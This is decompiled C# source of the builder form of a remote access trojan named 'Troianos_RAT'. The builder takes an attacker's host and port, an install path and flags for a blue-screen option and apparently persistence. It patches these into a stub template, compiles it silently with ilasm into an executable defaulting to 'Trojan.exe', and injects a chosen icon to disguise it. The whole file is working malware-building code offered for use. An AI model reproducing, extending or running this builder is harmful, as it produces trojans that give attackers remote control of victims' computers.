using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Troianos_RAT
{
	// Token: 0x0200000A RID: 10
	[DesignerGenerated]
	public partial class Builder : Form
	{
		// Token: 0x0600006D RID: 109 RVA: 0x001DC2A4 File Offset: 0x001DA6A4
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Builder.__ENCList;
			lock (_ENCList)
			{
				bool flag = Builder.__ENCList.Count == Builder.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Builder.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Builder.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Builder.__ENCList[num] = Builder.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Builder.__ENCList.RemoveRange(num, Builder.__ENCList.Count - num);
					Builder.__ENCList.Capacity = Builder.__ENCList.Count;
				}
				Builder.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000070 RID: 112 RVA: 0x001DD8FC File Offset: 0x001DBCFC
		// (set) Token: 0x06000071 RID: 113 RVA: 0x001DD914 File Offset: 0x001DBD14
		internal virtual TextBox host
		{
			[DebuggerNonUserCode]
			get
			{
				return this._host;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._host = value;
			}
		}

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000072 RID: 114 RVA: 0x001DD920 File Offset: 0x001DBD20
		// (set) Token: 0x06000073 RID: 115 RVA: 0x001DD938 File Offset: 0x001DBD38
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000074 RID: 116 RVA: 0x001DD944 File Offset: 0x001DBD44
		// (set) Token: 0x06000075 RID: 117 RVA: 0x001DD95C File Offset: 0x001DBD5C
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000076 RID: 118 RVA: 0x001DD968 File Offset: 0x001DBD68
		// (set) Token: 0x06000077 RID: 119 RVA: 0x001DD980 File Offset: 0x001DBD80
		internal virtual NumericUpDown port
		{
			[DebuggerNonUserCode]
			get
			{
				return this._port;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._port = value;
			}
		}

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000078 RID: 120 RVA: 0x001DD98C File Offset: 0x001DBD8C
		// (set) Token: 0x06000079 RID: 121 RVA: 0x001DD9A4 File Offset: 0x001DBDA4
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x0600007A RID: 122 RVA: 0x001DD9B0 File Offset: 0x001DBDB0
		// (set) Token: 0x0600007B RID: 123 RVA: 0x001DD9C8 File Offset: 0x001DBDC8
		internal virtual ComboBox dir
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dir;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._dir = value;
			}
		}

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x0600007C RID: 124 RVA: 0x001DD9D4 File Offset: 0x001DBDD4
		// (set) Token: 0x0600007D RID: 125 RVA: 0x001DD9EC File Offset: 0x001DBDEC
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x0600007E RID: 126 RVA: 0x001DD9F8 File Offset: 0x001DBDF8
		// (set) Token: 0x0600007F RID: 127 RVA: 0x001DDA10 File Offset: 0x001DBE10
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000080 RID: 128 RVA: 0x001DDA70 File Offset: 0x001DBE70
		// (set) Token: 0x06000081 RID: 129 RVA: 0x001DDA88 File Offset: 0x001DBE88
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox1_CheckedChanged);
				bool flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged -= value2;
				}
				this._CheckBox1 = value;
				flag = (this._CheckBox1 != null);
				if (flag)
				{
					this._CheckBox1.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x06000082 RID: 130 RVA: 0x001DDAE8 File Offset: 0x001DBEE8
		// (set) Token: 0x06000083 RID: 131 RVA: 0x001DDB00 File Offset: 0x001DBF00
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x06000084 RID: 132 RVA: 0x001DDB0C File Offset: 0x001DBF0C
		// (set) Token: 0x06000085 RID: 133 RVA: 0x001DDB24 File Offset: 0x001DBF24
		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x06000086 RID: 134 RVA: 0x001DDB30 File Offset: 0x001DBF30
		// (set) Token: 0x06000087 RID: 135 RVA: 0x001DDB48 File Offset: 0x001DBF48
		internal virtual TextBox VN
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VN;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._VN = value;
			}
		}

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x06000088 RID: 136 RVA: 0x001DDB54 File Offset: 0x001DBF54
		// (set) Token: 0x06000089 RID: 137 RVA: 0x001DDB6C File Offset: 0x001DBF6C
		internal virtual CheckBox bsod
		{
			[DebuggerNonUserCode]
			get
			{
				return this._bsod;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._bsod = value;
			}
		}

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x0600008A RID: 138 RVA: 0x001DDB78 File Offset: 0x001DBF78
		// (set) Token: 0x0600008B RID: 139 RVA: 0x001DDB90 File Offset: 0x001DBF90
		internal virtual TextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x0600008C RID: 140 RVA: 0x001DDB9C File Offset: 0x001DBF9C
		// (set) Token: 0x0600008D RID: 141 RVA: 0x001DDBB4 File Offset: 0x001DBFB4
		internal virtual CheckBox Isf
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Isf;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Isf = value;
			}
		}

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x0600008E RID: 142 RVA: 0x001DDBC0 File Offset: 0x001DBFC0
		// (set) Token: 0x0600008F RID: 143 RVA: 0x001DDBD8 File Offset: 0x001DBFD8
		internal virtual CheckBox Idr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Idr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Idr_CheckedChanged);
				bool flag = this._Idr != null;
				if (flag)
				{
					this._Idr.CheckedChanged -= value2;
				}
				this._Idr = value;
				flag = (this._Idr != null);
				if (flag)
				{
					this._Idr.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x06000090 RID: 144 RVA: 0x001DDC38 File Offset: 0x001DC038
		// (set) Token: 0x06000091 RID: 145 RVA: 0x001DDC50 File Offset: 0x001DC050
		internal virtual CheckBox Isu
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Isu;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Isu = value;
			}
		}

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x06000092 RID: 146 RVA: 0x001DDC5C File Offset: 0x001DC05C
		// (set) Token: 0x06000093 RID: 147 RVA: 0x001DDC74 File Offset: 0x001DC074
		internal virtual NumericUpDown klen
		{
			[DebuggerNonUserCode]
			get
			{
				return this._klen;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._klen = value;
			}
		}

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x06000094 RID: 148 RVA: 0x001DDC80 File Offset: 0x001DC080
		// (set) Token: 0x06000095 RID: 149 RVA: 0x001DDC98 File Offset: 0x001DC098
		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x06000096 RID: 150 RVA: 0x001DDCA4 File Offset: 0x001DC0A4
		// (set) Token: 0x06000097 RID: 151 RVA: 0x001DDCBC File Offset: 0x001DC0BC
		internal virtual TextBox exe
		{
			[DebuggerNonUserCode]
			get
			{
				return this._exe;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._exe = value;
			}
		}

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x06000098 RID: 152 RVA: 0x001DDCC8 File Offset: 0x001DC0C8
		// (set) Token: 0x06000099 RID: 153 RVA: 0x001DDCE0 File Offset: 0x001DC0E0
		internal virtual WaterFX WaterFX1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WaterFX1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._WaterFX1 = value;
			}
		}

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x0600009A RID: 154 RVA: 0x001DDCEC File Offset: 0x001DC0EC
		// (set) Token: 0x0600009B RID: 155 RVA: 0x001DDD04 File Offset: 0x001DC104
		internal virtual LinkLabel LinkLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel1_LinkClicked);
				bool flag = this._LinkLabel1 != null;
				if (flag)
				{
					this._LinkLabel1.LinkClicked -= value2;
				}
				this._LinkLabel1 = value;
				flag = (this._LinkLabel1 != null);
				if (flag)
				{
					this._LinkLabel1.LinkClicked += value2;
				}
			}
		}

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x0600009C RID: 156 RVA: 0x001DDD64 File Offset: 0x001DC164
		// (set) Token: 0x0600009D RID: 157 RVA: 0x001DDD7C File Offset: 0x001DC17C
		internal virtual LinkLabel LinkLabel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel2_LinkClicked);
				bool flag = this._LinkLabel2 != null;
				if (flag)
				{
					this._LinkLabel2.LinkClicked -= value2;
				}
				this._LinkLabel2 = value;
				flag = (this._LinkLabel2 != null);
				if (flag)
				{
					this._LinkLabel2.LinkClicked += value2;
				}
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x001DDDDC File Offset: 0x001DC1DC
		public Builder()
		{
			base.Load += this.Builder_Load;
			Builder.__ENCAddToList(this);
			this.string_0 = null;
			this.InitializeComponent();
		}

		// Token: 0x0600009F RID: 159 RVA: 0x001DDE10 File Offset: 0x001DC210
		private void Builder_Load(object sender, EventArgs e)
		{
			this.dir.SelectedIndex = 0;
			this.host.Text = Class6.smethod_2("host", this.host.Text);
			this.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(this.port.Value)));
			this.exe.Text = Class6.smethod_2("exe", this.exe.Text);
			this.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(this.dir.SelectedIndex)));
			this.VN.Text = Class6.smethod_2("vn", this.VN.Text);
			this.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", this.bsod.Checked.ToString()));
			this.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", this.Idr.Checked.ToString()));
			this.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", this.Isu.Checked.ToString()));
			this.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", this.Isf.Checked.ToString()));
			this.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", this.klen.Value.ToString()));
			this.string_0 = Class6.smethod_2("ico", string.Empty);
			bool flag = !File.Exists(this.string_0);
			if (flag)
			{
				this.string_0 = string.Empty;
			}
			flag = (Convert.ToDouble(this.port.Value) != Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(this.port.Value))));
			if (flag)
			{
				this.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(this.port.Value)));
			}
			try
			{
				flag = (Operators.CompareString(this.string_0, string.Empty, false) != 0);
				if (flag)
				{
					this.PictureBox1.Image = new Icon(Class6.smethod_2("ico", string.Empty)).ToBitmap();
					this.CheckBox1.Checked = true;
				}
			}
			catch (Exception ex)
			{
				this.string_0 = string.Empty;
			}
			this.VN.Text = "Lammer";
			this.exe.Text = "Trojan.exe";
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x001DE118 File Offset: 0x001DC518
		private void Button1_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				Filter = "|*.exe",
				FileName = this.VN.Text
			};
			bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = !this.CheckBox1.Checked;
				if (flag2)
				{
					this.string_0 = null;
				}
				flag2 = File.Exists(saveFileDialog.FileName);
				if (flag2)
				{
					File.Delete(saveFileDialog.FileName);
				}
				string text = File.ReadAllText(Application.StartupPath + "\\Stub.il");
				string newValue = Class6.smethod_4(string.Concat(new string[]
				{
					this.VN.Text,
					this.host.Text,
					Conversions.ToString(this.port.Value),
					this.exe.Text,
					this.dir.Text,
					this.bsod.Checked.ToString(),
					this.Idr.Checked.ToString(),
					this.Isu.Checked.ToString(),
					this.Isf.Checked.ToString()
				}));
				TextBox vn = this.VN;
				string text2 = vn.Text;
				vn.Text = text2;
				text = text.Replace("[VN]", Class6.smethod_14(ref text2)).Replace("[H]", this.host.Text).Replace("[P]", Conversions.ToString(this.port.Value)).Replace("[EXE]", this.exe.Text).Replace("[DR]", this.dir.Text.Replace("%", string.Empty)).Replace("[BD]", this.bsod.Checked.ToString()).Replace("[RG]", newValue).Replace("[Idr]", this.Idr.Checked.ToString()).Replace("[Isu]", this.Isu.Checked.ToString()).Replace("[Isf]", this.Isf.Checked.ToString()).Replace("[klen]", this.klen.Value.ToString());
				File.WriteAllText(Interaction.Environ("temp") + "\\stub.il", text);
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = Interaction.Environ("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\ilasm.exe",
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = string.Concat(new string[]
					{
						"/alignment=512 /QUIET \"",
						Interaction.Environ("temp"),
						"\\stub.il\" /output:\"",
						saveFileDialog.FileName,
						"\""
					})
				};
				Process.Start(startInfo).WaitForExit();
				flag2 = (this.string_0 != null && File.Exists(this.string_0));
				if (flag2)
				{
					IconN.InjectIcon(saveFileDialog.FileName, this.string_0);
				}
				IntPtr intptr_ = GClass2.BeginUpdateResource(saveFileDialog.FileName, false);
				byte[] array = File.ReadAllBytes(Application.StartupPath + "\\Stub.manifest");
				GClass2.UpdateResource(intptr_, (IntPtr)24, (IntPtr)1, 0, array, array.Length);
				GClass2.EndUpdateResource(intptr_, false);
				Class6.smethod_3("host", this.host.Text);
				Class6.smethod_3("p", Conversions.ToString(this.port.Value));
				Class6.smethod_3("exe", this.exe.Text);
				Class6.smethod_3("dir", Conversions.ToString(this.dir.SelectedIndex));
				Class6.smethod_3("vn", this.VN.Text);
				Class6.smethod_3("bsod", this.bsod.Checked.ToString());
				Class6.smethod_3("ico", this.string_0);
				Class6.smethod_3("Idr", this.Idr.Checked.ToString());
				Class6.smethod_3("Isu", this.Isu.Checked.ToString());
				Class6.smethod_3("Isf", this.Isf.Checked.ToString());
				Class6.smethod_3("klen", this.klen.Value.ToString());
				Interaction.MsgBox("Server Criado Com Sucesso! \r\n" + saveFileDialog.FileName, MsgBoxStyle.Information, "FeedHax");
				this.Close();
			}
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x001DE628 File Offset: 0x001DCA28
		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox1.Checked;
			if (@checked)
			{
				bool flag = this.PictureBox1.Image == null;
				if (flag)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog
					{
						Filter = "|*.ico",
						Title = "",
						FileName = string.Empty
					};
					flag = (openFileDialog.ShowDialog() == DialogResult.OK);
					if (flag)
					{
						this.string_0 = openFileDialog.FileName;
						this.PictureBox1.Image = Image.FromFile(this.string_0);
					}
				}
			}
			else
			{
				this.PictureBox1.Image = null;
			}
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x001DE6C8 File Offset: 0x001DCAC8
		private void Idr_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = !this.Idr.Checked;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.exe.Text, string.Empty, false) == 0;
				if (flag2)
				{
				}
				this.exe.Enabled = false;
				this.dir.Enabled = false;
			}
			else
			{
				this.exe.Enabled = true;
				this.dir.Enabled = true;
			}
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x001DE740 File Offset: 0x001DCB40
		private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("http://troianoshackings.blogspot.com.br/");
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x001DE750 File Offset: 0x001DCB50
		private void LinkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCUQwjm3KDbi28FBvT08PRvQ?sub_confirmation=1");
		}

		// Token: 0x04000036 RID: 54
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000038 RID: 56
		[AccessedThroughProperty("host")]
		private TextBox _host;

		// Token: 0x04000039 RID: 57
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400003A RID: 58
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x0400003B RID: 59
		[AccessedThroughProperty("port")]
		private NumericUpDown _port;

		// Token: 0x0400003C RID: 60
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x0400003D RID: 61
		[AccessedThroughProperty("dir")]
		private ComboBox _dir;

		// Token: 0x0400003E RID: 62
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x0400003F RID: 63
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000040 RID: 64
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x04000041 RID: 65
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x04000042 RID: 66
		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		// Token: 0x04000043 RID: 67
		[AccessedThroughProperty("VN")]
		private TextBox _VN;

		// Token: 0x04000044 RID: 68
		[AccessedThroughProperty("bsod")]
		private CheckBox _bsod;

		// Token: 0x04000045 RID: 69
		[AccessedThroughProperty("T1")]
		private TextBox _T1;

		// Token: 0x04000046 RID: 70
		[AccessedThroughProperty("Isf")]
		private CheckBox _Isf;

		// Token: 0x04000047 RID: 71
		[AccessedThroughProperty("Idr")]
		private CheckBox _Idr;

		// Token: 0x04000048 RID: 72
		[AccessedThroughProperty("Isu")]
		private CheckBox _Isu;

		// Token: 0x04000049 RID: 73
		[AccessedThroughProperty("klen")]
		private NumericUpDown _klen;

		// Token: 0x0400004A RID: 74
		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		// Token: 0x0400004B RID: 75
		[AccessedThroughProperty("exe")]
		private TextBox _exe;

		// Token: 0x0400004C RID: 76
		[AccessedThroughProperty("WaterFX1")]
		private WaterFX _WaterFX1;

		// Token: 0x0400004D RID: 77
		[AccessedThroughProperty("LinkLabel1")]
		private LinkLabel _LinkLabel1;

		// Token: 0x0400004E RID: 78
		[AccessedThroughProperty("LinkLabel2")]
		private LinkLabel _LinkLabel2;

		// Token: 0x0400004F RID: 79
		private string string_0;
	}
}
